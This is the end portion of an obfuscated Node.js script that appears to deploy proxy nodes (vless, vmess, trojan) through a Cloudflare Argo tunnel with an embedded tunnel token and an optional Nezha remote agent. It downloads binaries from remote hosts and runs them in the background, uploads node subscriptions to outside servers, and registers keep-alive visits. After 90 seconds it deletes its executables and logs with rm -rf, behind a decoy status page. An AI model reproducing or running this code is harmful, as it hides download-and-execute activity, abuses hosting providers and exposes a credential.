o','fileName','http://ip-api.com/json','https://arm64.ssss.nyc.mn/v1','\x20failed:\x20','NEZHA_KEY','\x20-p\x20','utf-8','15049746cnYtKq','forEach','country_code','ARGO_PORT','https+local://8.8.8.8/dns-query','filter','/tunnel.yml\x20run','ARGO_AUTH','&fp=firefox&type=ws&host=','18AvSoXb','base64','443','Empowerment\x20success\x20for\x20','--tls','none','\x0a\x20\x20tunnel:\x20','tcp','log','\x22\x20>\x20/dev/null\x202>&1','Download\x20','countryCode','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NEZHA_PORT','amd','\x20successfully','automatic\x20access\x20task\x20added\x20successfully','stringify','abcdefghijklmnopqrstuvwxyz','\x20>/dev/null\x202>&1\x20&','PROJECT_URL','firefox','catch','clear','readFileSync','\x20-c\x20','1984768iWkuQx','substring','promises','2087','UUID','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','.exe\x20>\x20nul\x202>&1','config.yaml','AUTO_ACCESS','420069kAVmJy','unlinkSync','ARGO_DOMAIN:','https://arm64.ssss.nyc.mn/bot','2083','/vmess-argo?ed=2560','del\x20/f\x20/q\x20','application/json','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','xtls-rprx-vision','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','test','329857XooFqS','Add\x20automatic\x20access\x20task\x20faild:\x20','Unknown','tls','toString','\x20is\x20running','/api/add-nodes','Content-Type','random','NEZHA\x20variable\x20is\x20empty,skip\x20running','post','response','org','listen','tunnel.json','existsSync','split','\x0avless://','3060180BbQlHU','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','127.0.0.1','path','php\x20running\x20error:\x20','block','status','https://amd64.ssss.nyc.mn/agent','quic','exec','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','list.txt','map','/sub.txt\x20saved\x20successfully','https://oooo.serv00.net/add-url','mkdirSync','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','CFPORT','vless','/config.json\x20>/dev/null\x202>&1\x20&','?encryption=none&security=tls&sni=','send','arm','\x20>\x20nul\x202>&1','pipe','join','has','readFile','fileUrl','message','eyJhIjoiZDhlZDg1MmM0Y2I5YTk3Njk2Y2Q4MTJlNDJmZDcyM2QiLCJ0IjoiNWZhMzlkNzAtODhhZi00MDJjLTk5ZTUtODAzZmVhNTBiMzVjIiwicyI6Ill6SXpPRGMyWXpFdE9HUTJZaTAwWlRBeUxXRXpNR1V0TXpSbE56TmtOMlkxTkdSbCJ9','finish','\x0a\x20\x20\x20\x20','from','nohup\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','text/plain;\x20charset=utf-8','/trojan-argo','https://amd64.ssss.nyc.mn/v1','UPLOAD_URL','pop','config.json','\x20-s\x20','platform','FILE_PATH','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/api/add-subscriptions','ArgoDomain:','unlink','3006964HswFjf','index.html','charAt','?security=tls&sni=','all','2096','Error\x20downloading\x20files:','get','Subscription\x20uploaded\x20successfully','win32','error','true','writeFileSync','1741061HOIkdE','PORT','Error\x20in\x20startserver:','basename','false','http\x20server\x20is\x20running\x20on\x20port:','statSync','match','arch','vmess','\x0a\x0avmess://','&path=%2Fvless-argo%3Fed%3D2560#','galaxy','ARGO_DOMAIN','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','tunnel.yml','railway.tokit.dpdns.org','aarch64','sub.txt','16YVxNVs','Unhandled\x20error\x20in\x20startserver:'];_0x30b5=function(){return _0x2a235a;};return _0x30b5();}function cleanFiles(){const _0x587d9b={_0x3aea32:0x1a8,_0x541f19:0x187,_0x4435d0:0x100},_0x31009d={_0x537008:0x117,_0x42106f:0x135};setTimeout(()=>{const _0x2452e3={_0x218d41:0x144,_0x5de827:0x135},_0x321f20=_0x3657,_0x4d46d3=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4d46d3[_0x321f20(0x112)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4d46d3['push'](phpPath);process[_0x321f20(0x199)]===_0x321f20(_0x587d9b._0x3aea32)?exec(_0x321f20(0x156)+_0x4d46d3['join']('\x20')+_0x321f20(0x185),_0x59efd6=>{const _0x1acd78=_0x321f20;console[_0x1acd78(_0x2452e3._0x218d41)](),console[_0x1acd78(_0x2452e3._0x5de827)](_0x1acd78(0x117)),console[_0x1acd78(_0x2452e3._0x5de827)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x4d46d3[_0x321f20(_0x587d9b._0x541f19)]('\x20')+_0x321f20(_0x587d9b._0x4435d0),_0x1209c6=>{const _0x1133c8=_0x321f20;console[_0x1133c8(0x144)](),console['log'](_0x1133c8(_0x31009d._0x537008)),console[_0x1133c8(_0x31009d._0x42106f)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3b9808={_0x17b0ad:0x166,_0x44e558:0x157,_0x13c89c:0x15d,_0x289033:0x18b},_0x157434=_0x16847c;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x157434(0x135)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x5df0ad=await axios[_0x157434(_0x3b9808._0x17b0ad)](_0x157434(0x17c),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x157434(_0x3b9808._0x44e558)}});return console['log'](_0x157434(0x13d)),_0x5df0ad;}catch(_0x3346f3){return console[_0x157434(0x1a9)](_0x157434(_0x3b9808._0x13c89c)+_0x3346f3[_0x157434(_0x3b9808._0x289033)]),null;}}async function startserver(){const _0x51d255={_0x57a353:0x1a9},_0x8f3068=_0x16847c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x45301f){console[_0x8f3068(_0x51d255._0x57a353)](_0x8f3068(0x1ae),_0x45301f);}}function _0x3657(_0x57eadc,_0x5ca989){const _0x30b52b=_0x30b5();return _0x3657=function(_0x3657dd,_0xaba05b){_0x3657dd=_0x3657dd-0xfe;let _0x291509=_0x30b52b[_0x3657dd];return _0x291509;},_0x3657(_0x57eadc,_0x5ca989);}startserver()[_0x16847c(0x143)](_0x31bbc3=>{const _0x2388bb={_0x3fdc2:0x1c0},_0x4b2f76=_0x16847c;console[_0x4b2f76(0x1a9)](_0x4b2f76(_0x2388bb._0x3fdc2),_0x31bbc3);}),app[_0x16847c(0x1a6)]('/',async function(_0x56eab9,_0xa7446){const _0x2c88d9={_0x4413ba:0x187,_0x42892d:0x1a0,_0xac8b3c:0x189,_0x1dfb3d:0x183},_0x685f4a=_0x16847c;try{const _0x26ba13=path[_0x685f4a(_0x2c88d9._0x4413ba)](__dirname,_0x685f4a(_0x2c88d9._0x42892d)),_0x2fa7e4=await fs[_0x685f4a(0x149)][_0x685f4a(_0x2c88d9._0xac8b3c)](_0x26ba13,'utf8');_0xa7446[_0x685f4a(0x183)](_0x2fa7e4);}catch(_0x46fb1e){_0xa7446[_0x685f4a(_0x2c88d9._0x1dfb3d)]('Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!');}}),app[_0x16847c(0x169)](PORT,()=>console['log'](_0x16847c(0x1b1)+PORT+'!'));